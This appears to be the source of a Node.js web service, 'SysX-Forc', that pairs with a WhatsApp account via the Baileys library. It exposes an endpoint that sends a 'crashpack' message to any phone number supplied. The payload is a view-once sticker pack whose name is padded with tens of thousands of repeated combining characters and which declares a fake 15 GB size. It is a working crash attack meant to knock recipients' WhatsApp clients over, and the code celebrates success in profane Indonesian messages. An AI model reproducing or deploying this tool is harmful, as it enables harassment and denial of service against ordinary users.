const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const QRCode = require('qrcode-terminal');
const fs = require('fs');
const path = require('path');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// === MIDDLEWARE FORCE JSON ===
app.use((req, res, next) => {
    // Set header JSON untuk semua response
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).json({ status: 'OK' });
    }
    next();
});

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// === STATIC FILE UNTUK FRONTEND ===
app.use(express.static(path.join(__dirname, 'public')));

// === ERROR HANDLER JSON ===
app.use((err, req, res, next) => {
    console.error('🔥 ERROR SADIS:', err.message);
    res.status(500).json({ 
        success: false, 
        error: err.message || 'Internal Server Error, BANGSAT!' 
    });
});

// === 404 HANDLER ===
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'NOT_FOUND', 
        message: `Endpoint ${req.path} gak ditemukan, KONTOL!` 
    });
});

// === GLOBAL VARIABLE ===
let sock = null;
let isConnected = false;
let pairCode = '';
let qrCode = '';
let authState = null;

// === FUNGSI CRASHER (YANG LU KASIH) ===
async function crashpack(sock, jid) {
    try {
        const proto = require('@whiskeysockets/baileys').proto;
        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

        const messageContent = generateWAMessageFromContent(
            jid,
            proto.Message.fromObject({
                viewOnceMessage: {
                    message: {
                        stickerPackMessage: {
                            stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
                            name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                            publisher: "",
                            stickers: [
                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "BIuHVMLzx5kMva0d7V-BFo27Q6zQsJgVF3XFcVf+HP4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "fPYWiNHg9XpGK-KNkRg8ds+ntFG9afumoaT9gtGEPZM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "aBR+ssf7vbIjBMC4pkTdKTGpDby+-IssCv+Pq9G0cV0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "3B5N3fCByKKgVJKlID8xQS1Z+HxEBFdDUZRAxyaAoy8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "1SHkxzMBF8JRAFx9vdZ9lywC3HHqwcIPF1ta5hQnhJM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "LRS90f31qhWdOiaEim6yOGHpUMQscTv6UrtAxerLm3c=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "XNgtQvK537PoaRdklYwCSLmak4+tCUmAOVV46Q+W5F0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "RXhEbR5rzx1fj607pDiebPlYqCa4L1IxWuJ3KLiUQLk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "Ty0fHlUBsdPKjVl3Nw93kZaABOOda1joRUJMCj23DKs=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "ErZgydAcXx6Cro5pF9N2j5wuCCXhgdWAQLJHM58So-0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "lxxxDjc+kRobJpOGGMYeLkuTe7g6elcK7lVGQeEfGvE=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "di9bbDe7LWXsokpKPRWf60Ab2IzmQO5uT4Cxu-p8hbM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "bxsGaNamEq7VSUz5w77GHrDn8bze7G+E42fitTh2aMU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "zS77ZBj9ZlWToWHHF4-DyPw9fSErdKSkYXwxBxzUa+w=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "PJAhbJd3LqZJM-MFCFsnhxQrj2UJPTEzc4-jdi+KBCk=.webp", isAnimated: false, emojis: ["🤩 🎉"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "RVUjvO3B-xlWtHtxCj+Jl8muksvDS2rVsZplYQAm7sk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "SXecMhGacjfeAO9RV+isEjuz7PsxxbklhRhtc8Ws5tQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "2oANuQSdkMD2MN9zpf7nbGrqC9dRN7aIJiPN6Z-oUKM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "7nz3gILi2QnQdqOY2gxTOlwv-rxeV6iDLWSqOys6x2U=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "C9t3SIb-puZnRCoaP7wyaYJ7XwTOxs4nK1a2qAb73-I=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "6mcrtxMTq0BPHIoVVgqdT3gP6pZi9dyhiorBFQl5ATo=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "4oZyypo1Fc8DJxPxu4UCUxw2YWXfek5Fs+lh4eUvBew=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "oKLOjMapG49YFQTkhCv-xrVXPPzaMLHSi5xB1uimac4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "YBvO1VtCrYWqkMj7HNt79+kbQz-u2NLfmUH47Q8FM3E=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "1sPL9NC25fNGAyfbeOEQoIaMsqQpyu2S+UqsoFqe7v0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "GJ24Wz79rkRgjiN7GYw3Fiwa8UuLIV5Ko8QEIhDjlpc=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "cjMmFaeHUCxGMw-VfaHafx8YDnDaU-xjI5o5FVoz3RI=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "d7ZA7fY10jlQADwjIFFTR3iTMMwBpwPxjouWA1Z8hgQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "TGm4OaC2EC90RlXmgmzzu1X18Us2meD45yZa7nHdKJg=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "vLxtzLZGDYkzJ95pqE+N-YEu2Cz-x1x58Coge-tEJq8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "6Ex3lAHCuMoRuuDjp15c-R1jX0lq9OwKlDaPfsi9+PE=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "wlLq-60vRvaO11ngHKTyysMisdWzfVwaTbxFOfmzBIM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "3KmUDiU3r78cKXBrOstZa0bSxKYA+skw9kyZwgm11io=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "nLzMLWdRKx4jNCubzzB-WaJP3nAhGxbJOLc4dsy7dmU=.webp", isAnimated: false, emojis: ["🤩 🎉"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "XYZUdb2UGBdNuv8NjmN7jDkRsTNot53I+xt-DGgLg00=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "XNs9t4SIvxQ94OxbD5hd1vFt0CDMIUqG0QdyJ9BtyME=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "vt4GfKxPZ6fg1HRNgzRQCZUH4Y-T718C1gWWk0zMNKM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "LJY4vR5atkdgCeSS1Kcm6B+skPj+IXZJh4xZI4ZRBO4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "FQH4BTgMR7-+wWpkJVLo2MC0Ik7dSLN7Dq9gAU6qKqs=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "0Pw7-ZXjWnjZ4l9pj0cQkardn9yfso3O1RQcIvUeg14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "iCPFgiRSHopvvBz-js3uRA7JiUBbrn7cBn-1bWE3qns=.webp", isAnimated: false, emojis: ["😋 😎 🤣 😂 😁"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "XAWnA5EleA3Y5r8dn+OgIrcyUBR3fYqbWx4jCA7MxJk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
                                { fileName: "PY9o9fkPmUxtCe9+8N39zwSbfZ-Jj0RcjAvW2JP31io=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
                            ],
                            fileLength: "8020935",
                            fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
                            fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
                            mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
                            directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "",
                            mediaKeyTimestamp: "1749506440",
                            trayIconFileName: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11293192_987589920117341_7624412198674010830_n.enc?ccb=11-4&oh=01_Q5Aa1wEsjICRK3G8YjlWAC0VhEhMrjAbUBenZphNNmjDSSXM7w&oe=686ED116&_nc_sid=5e03e0",
                            thumbnailSha256: "UOcoPZ0vEtKCLWiY4LjSjJXqBd93qjCI9cUXo70CCtY=",
                            thumbnailEncSha256: "A+BTqfSW5Cnt+tUwAHHcGPuppnk49pB72O3iz9jPeWg=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ZGNiZTY2OWU1NDI1YzBjMmE0Y2ExODQ1Nzc5OWM3MGJlNDZmMzgzYTlhNDg1YzdhNDdjNTBlODI0YTc1YTVjZQ==",
                            stickerPackSize: "15000000000",
                            stickerPackOrigin: "USER_CREATED"
                        }
                    }
                }
            }),
            { userJid: jid }
        );

        await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
        return { success: true, target: jid };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// === BAILEYS CONNECT ===
async function connectBaileys() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth_info');
        authState = state;

        sock = makeWASocket({
            version: [2, 3000, 1015901307],
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['SysX-Forc', 'Chrome', '120.0.0.0']
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                qrCode = qr;
                QRCode.generate(qr, { small: true });
                console.log('✅ QR CODE GENERATED');
            }

            if (connection === 'open') {
                isConnected = true;
                console.log('✅ CONNECTED TO WHATSAPP');
            }

            if (connection === 'close') {
                isConnected = false;
                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) {
                    console.log('🔁 RECONNECTING...');
                    setTimeout(connectBaileys, 5000);
                }
            }
        });

        sock.ev.on('pairing-code', (code) => {
            pairCode = code;
            console.log(`📱 PAIR CODE: ${code}`);
        });

        return sock;
    } catch (error) {
        console.error('🔥 ERROR CONNECT:', error.message);
        return null;
    }
}

// === API ENDPOINTS ===

// 1. LOGIN
app.post('/api/login', (req, res) => {
    try {
        const { password } = req.body;
        if (password === process.env.PASSWORD) {
            res.json({ success: true, message: 'Login berhasil, BANGSAT!' });
        } else {
            res.status(401).json({ success: false, message: 'Password salah, KONTOL!' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 2. STATUS
app.get('/api/status', async (req, res) => {
    try {
        if (!sock) {
            await connectBaileys();
        }
        res.json({
            connected: isConnected,
            qr: qrCode || null,
            pairCode: pairCode || null
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3. PAIR CODE
app.post('/api/pair', async (req, res) => {
    try {
        const { number } = req.body;
        if (!number) {
            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
        }

        if (!sock) {
            await connectBaileys();
        }
        
        const code = await sock.requestPairingCode(number);
        pairCode = code;
        res.json({ success: true, pairCode: code });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 4. EXECUTE CRASH
app.post('/api/execute', async (req, res) => {
    try {
        const { target } = req.body;
        
        if (!target) {
            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
        }

        if (!sock || !isConnected) {
            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
        }

        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const result = await crashpack(sock, jid);
        
        if (result.success) {
            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
        } else {
            res.status(500).json({ success: false, error: result.error });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 5. LOGOUT
app.post('/api/logout', async (req, res) => {
    try {
        if (sock) {
            await sock.logout();
            isConnected = false;
            sock = null;
            authState = null;
            qrCode = '';
            pairCode = '';
            
            if (fs.existsSync('auth_info')) {
                fs.rmSync('auth_info', { recursive: true, force: true });
            }
        }
        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// === START SERVER ===
connectBaileys();

app.listen(PORT, () => {
    console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
    console.log(`👿 LU BISA AKSES DI http://localhost:${PORT}`);
});

module.exports = app;
